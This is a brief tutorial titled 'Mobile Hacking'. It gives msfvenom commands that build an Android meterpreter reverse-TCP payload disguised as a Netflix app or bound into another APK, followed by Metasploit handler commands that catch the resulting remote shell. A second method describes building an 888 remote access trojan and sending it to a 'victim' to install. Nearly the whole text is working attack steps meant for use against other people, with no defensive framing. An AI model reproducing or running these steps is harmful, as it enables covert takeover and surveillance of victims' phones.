                                                              Mobile Hacking

First Method :
Mobile Hacking through msfvenom :
#msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip address> LPORT=1337 -o /home/kali/Desktop/netflix.apk - This command will create our apk.
#msfvenom -x flappy.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=1337 -o flappynew.apk - For binding our trojan with another apk.

Listen to the connection on Metasploit :
#msfconsole
#use exploit/multi/handler
#set payload android/meterpreter/reverse_tcp
#set lhost <Ip address>
#set lport 1337
#exploit
After that install that apk in the victim's mobile for the connection.
Now use command #help to show the full menu.

Second Method :
Mobile Hacking through 888 RAT(Remote Access Trojan) :
For this rat first, you have to install java JDK and JRE in your system, then you have to copy the apktool file and paste it to Win+R>%temp%>apkx and paste this in this folder.
Now make a RAT using this tool, set your IP, and port and we can find this rat in %temp% file. After that send this rat to the victim, when the victim will install we will get
the access.
